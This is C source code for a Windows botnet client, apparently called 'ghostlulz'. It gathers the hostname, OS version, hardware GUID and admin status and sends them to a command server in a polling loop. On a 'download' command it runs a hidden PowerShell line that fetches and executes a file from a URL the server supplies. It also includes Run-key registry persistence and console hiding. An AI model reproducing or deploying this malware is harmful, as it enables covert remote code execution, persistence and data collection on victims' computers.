#include<stdio.h>
#include <stdlib.h>
#include<winsock2.h>
#include<windows.h>
#include <ws2tcpip.h>
#pragma comment(lib,"ws2_32.lib") // winsock library
#pragma comment(lib,"Advapi32.lib") // winsock library


void addstartup();
void adminyn(char* pc);
void connect_server(SOCKET* s,char* pc,char* version); // connect to page and get 
void download(char* server_reply); // download and execute file
void os_version(char* version);
void freeme();
int main()
{	
	// remove console window
	//freeme();
	
	Sleep(20000); // miliseconds 1000 = 1 sec
	char pc[255];
	
	// check to see if we are admin or not
	adminyn(pc); 
	
	// computer name
	TCHAR computername[MAX_COMPUTERNAME_LENGTH + 1]; // used for computer_name func
	computer_name(computername);
	//printf("%s",computername);
	
	// windows version
	char version[50] ; // used for os_version func
	os_version(version);
	
	
	WSADATA WSA; 
	SOCKET s; // our socket
	struct sockaddr_in server; // socket info for server 
	char* message, server_reply[2000]; // holds mesage recv and message sent
	int recv_size; // bytes recived 
	struct sockaddr_in SockAddr;// used with gethostbyname
	
	char url[50] = "localhost";
	
	// initalise winsock library first param is version 
	WSAStartup(MAKEWORD(2,2),&WSA);
	
	// get IP from Url
	struct hostent *ip = gethostbyname(url);
	memcpy(&(SockAddr.sin_addr),ip->h_addr,ip->h_length);
	char* pIP = inet_ntoa(SockAddr.sin_addr);
	
	
	WSACleanup(); 
	
	//addstartup(); // add to registry startup
	
	while(1)
	{
		WSAStartup(MAKEWORD(2,2),&WSA); // initalise winsock library first param is version 
		
		// our socket info ipv4 tcp
		s = socket(AF_INET,SOCK_STREAM, 0);

		// server info IP Port
		server.sin_addr.s_addr = inet_addr(pIP); // server ip
		server.sin_family = AF_INET;// IPV4
		server.sin_port = htons(12); // server port
		
		//connect to server
		connect(s,(struct sockaddr *)&server,sizeof(server)); 
		
		//  checkin/send GET requqest to server
		connect_server(&s,pc,version); 
		
		//recv html from server
		recv_size = recv(s,server_reply,2000,0);
		//server_reply[recv_size] = '\0';
		
		//check for download command in server reply
		if(strstr(server_reply, "download") != NULL)
		{
			download(server_reply);
		}
		
		//clean up
		closesocket(s); 
		WSACleanup(); 
		Sleep(60000); // miliseconds 1000 = 1 sec
	}
	
}
void addstartup()
{
		TCHAR path[100];
		GetModuleFileName(NULL,path,100);
		HKEY newValue;
		RegOpenKey(HKEY_CURRENT_USER ,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);
		RegSetValueEx(newValue,"ghostlulz",0,REG_SZ,(LPBYTE)path,sizeof(path));
		RegCloseKey(newValue);
}

void adminyn(char * pc)
{
	// function to check if program is running as admin
	
	BOOL IsUserAnAdmin();
	/*++ 
	Routine Description: This routine returns TRUE if the caller's
	process is a member of the Administrators local group. Caller is NOT
	expected to be impersonating anyone and is expected to be able to
	open its own process and process token. 
	Arguments: None. 
	Return Value: 
	   TRUE - Caller has Administrators local group. 
	   FALSE - Caller does not have Administrators local group. --
	*/ 
	
	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup; 
	b = AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&AdministratorsGroup); 
	if(b) 
	{
		if (!CheckTokenMembership( NULL, AdministratorsGroup, &b)) 
		{
			 b = FALSE;
		} 
		FreeSid(AdministratorsGroup); 
	}

	if(b==FALSE)
	{
		printf("user");
		strcpy(pc,"user");
	}
	else if(b==TRUE)
	{
		printf("admin");
		strcpy(pc, "admin");
	}
}

void connect_server(SOCKET* s,char* pc,char* version)
{
	
	
	HW_PROFILE_INFO hwProfileInfo;// hwid
	//send data to server
	GetCurrentHwProfile(&hwProfileInfo);// get hwid info
	
	// format http requests
	char * str1;
	char* str2;
	char* str3;
	char* str4;
	char* str5;
	char* str20;
	
	str1 = hwProfileInfo.szHwProfileGuid;
	str2 = "GET /ghost/connect.php?hwid=";
	str3 = "&version=";
	str20= "&pc=";
	str4 = "&os=windows"; //variable  PC should go here
	str5 = " HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n";
	
	char * message2 = (char *) malloc(1 + strlen(str1)+ strlen(str2)+ strlen(str3)+ strlen(pc)+ strlen(str5) + strlen(str20)+strlen(version)+strlen(str4)+strlen(pc) );
	
	strcpy(message2,str2);
	strcat(message2,str1);
	strcat(message2,str3);
	strcat(message2,version);
	strcat(message2,str20);
	strcat(message2,pc);
	strcat(message2,str4);
	strcat(message2,str5);
	
	
	// send http requests
	send(*s,message2,strlen(message2),0);
}
void download(char* server_reply)
{
	char* p = strstr(server_reply, "download");// copy only the line with our command
	char* c = p+9; // strip off the word download 
	//filter out file name
	char* pp = strchr(p+9,'/');// find / char
	char* ppp = pp;
	while(pp) // loop until last char found
	{
		puts(pp+1);// pp+1 strip of the / tag
		ppp=pp;
		pp = strchr(pp+1,'/'); // find / char	
	}
	// make powershell download command
	char * str6;
	char* str7;
	char* str8;
	char* str9;
	char* str10;
	char* str11;
	char* str12;
	
	str6 = "PowerShell (New-Object System.Net.WebClient).DownloadFile('";
	str7 = p+9; // url to download from
	str8 = "','";
	str9 = ppp+1; // file name
	str10 = "');(New-Object -com Shell.Application).ShellExecute('";
	str11 =ppp+1; // file name
	str12 = "');";
	
	char * message3 = (char *) malloc(1 + strlen(str6)+ strlen(str7)+ strlen(str8)+ strlen(str9)+ strlen(str10)+ strlen(str11)+ strlen(str12) );
	
	strcpy(message3,str6);
	strcat(message3,str7);
	strcat(message3,str8);
	strcat(message3,str9);
	strcat(message3,str10);
	strcat(message3,str11);
	strcat(message3,str12);
	
	//execute powerhsell command
	WinExec(message3,SW_HIDE); // download and execute file *****must use winexec not system() with sw_hide option to hide console window*****
	free(message3);
}
void freeme()
{
	 FreeConsole(); // removes console window/ runs program silent in background
}
void os_version(char* version)
{
	OSVERSIONINFOEX info;
    ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
    info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

	// os version
    GetVersionEx(&info);
	
    //printf("Windows version: %u.%u\n", info.dwMajorVersion, info.dwMinorVersion);
	if(info.dwMajorVersion == 6 && info.dwMinorVersion == 1)
	{
		strcpy(version, "Windows7|Server2012");
		
	}
	else if(info.dwMajorVersion == 6 && info.dwMinorVersion == 0)
	{
		strcpy(version, "WindowsVista|server2008");
		
	}
	else if(info.dwMajorVersion == 6 && info.dwMinorVersion == 2)
	{
		strcpy(version, "Windows8|server2012");
		
	}
	else if(info.dwMajorVersion == 6 && info.dwMinorVersion == 3)
	{
		strcpy(version, "Windows8.1|Server2012R");
		
	}
	else if(info.dwMajorVersion == 10 && info.dwMinorVersion == 0)
	{
		strcpy(version, "Windows10|Server2008");
		
	}
	else
	{
		strcpy(version, "Unknown");
	}
	
}

void computer_name(TCHAR * computername)
{
	TCHAR computernamee[MAX_COMPUTERNAME_LENGTH + 1]; // used for computer_name func
	// computer name
	DWORD size = sizeof(computernamee) / sizeof(computernamee[0]);
	GetComputerName(computernamee, &size);
	strcpy(computername, computernamee);
	
}
